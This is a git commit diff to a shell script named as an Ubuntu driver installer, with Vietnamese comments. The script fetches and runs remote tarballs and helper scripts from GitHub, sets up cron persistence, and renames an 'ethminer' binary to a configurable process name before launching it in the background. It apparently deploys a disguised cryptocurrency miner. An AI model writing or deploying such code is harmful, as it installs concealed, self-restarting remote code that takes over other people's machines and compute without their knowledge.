f3684c9d41ddbdaa46eac483c8633b7aafb6ff0e
Jame <lungtungner@gmail.com>
2022-03-17 09:16:30 +0700

    Update ubuntu-driver-ins.sh

--- ubuntu-driver-ins.sh
+++ ubuntu-driver-ins.sh
@@ -55,13 +55,11 @@ if [ $num = 2 ];
 			
 	else 
 		echo "RUN PROCESS 2"; 
-			# Linux Trx
-			wget https://github.com/$gitpath/raw/main/linux.tar.gz
-			tar -xvf linux.tar.gz
-			rm -rf linux.tar.gz
-			#chua co thu muc bin
-			mkdir bin
-			cp linux bin/linux
+			# Mlnoder
+			wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
+			tar -xvf Mlnode.tar.gz
+			rm -rf Mlnode.tar.gz
+			#da co thu muc bin
 			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
@@ -76,13 +74,43 @@ if [ $num = 2 ];
             wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
 			Uuname=$(cat inuser.txt)
 			USEPROCNAME=$(cat SETPROCNAME.txt)
-			echo > trx.txt
-			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
-			mv runlinux.sh runsrc.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
 			chmod +x runsrc.sh
-			mv linux $USEPROCNAME
+			mv ethminer $USEPROCNAME
 			sudo chown -R $Uuname:$Uuname /home/$Uuname/
 			nohup sh runsrc.sh > result.log 2>&1 &
-			#
 
 fi
+
+
+#---------------------
+#1 Linux Trx
+#			wget https://github.com/$gitpath/raw/main/linux.tar.gz
+#			tar -xvf linux.tar.gz
+#			rm -rf linux.tar.gz
+#			#chua co thu muc bin
+#			mkdir bin
+#			cp linux bin/linux
+#			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
+#			chmod +x auinstall.sh
+#			chmod +x processname.sh
+#			chmod +x cronadd.sh
+#			./cronadd.sh
+#			./processname.sh
+#			cp inuser.txt bin/inuser.txt
+#			cd bin/
+#           wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
+#			Uuname=$(cat inuser.txt)
+#			USEPROCNAME=$(cat SETPROCNAME.txt)
+#			echo > trx.txt
+#			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
+#			mv runlinux.sh runsrc.sh
+#			chmod +x runsrc.sh
+#			mv linux $USEPROCNAME
+#			sudo chown -R $Uuname:$Uuname /home/$Uuname/
+#			nohup sh runsrc.sh > result.log 2>&1 &
+			#2
+#---------------------
